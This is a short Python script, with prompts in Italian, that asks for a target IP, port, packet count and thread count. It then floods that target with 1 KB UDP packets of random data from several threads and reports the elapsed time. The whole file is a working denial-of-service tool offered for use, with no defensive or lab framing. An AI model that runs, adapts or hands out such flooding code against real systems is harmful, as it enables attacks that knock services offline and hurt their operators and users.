import socket
import random
import threading
import time

def send_udp_flood(target_ip, target_port, num_packets, thread_id):
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = 1024
    random_data = bytearray(random.getrandbits(8) for _ in range(packet_size))

    try:
        for _ in range(num_packets):
            udp_socket.sendto(random_data, (target_ip, target_port))
        print(f"Thread {thread_id}: Inviati {num_packets} pacchetti UDP a {target_ip}:{target_port}")
    except Exception as e:
        print(f"Thread {thread_id}: Errore durante l'invio dei pacchetti: {e}")
    finally:
        udp_socket.close()

if __name__ == "__main__":
    try:
        target_ip = input("Inserisci l'IP target: ")
        target_port = int(input("Inserisci la porta target: "))
        num_packets = int(input("Quanti pacchetti da 1 KB vuoi inviare per thread? "))
        num_threads = int(input("Quanti thread vuoi utilizzare? "))

        start_time = time.time()
        
        threads = []
        for i in range(num_threads):
            thread = threading.Thread(target=send_udp_flood, args=(target_ip, target_port, num_packets, i+1))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        end_time = time.time()
        elapsed_time = end_time - start_time
        print(f"Tempo totale impiegato: {elapsed_time:.2f} secondi")

    except ValueError:
        print("inserisci un numero valido.")
    except Exception as e:
        print(f"Errore: {e}")
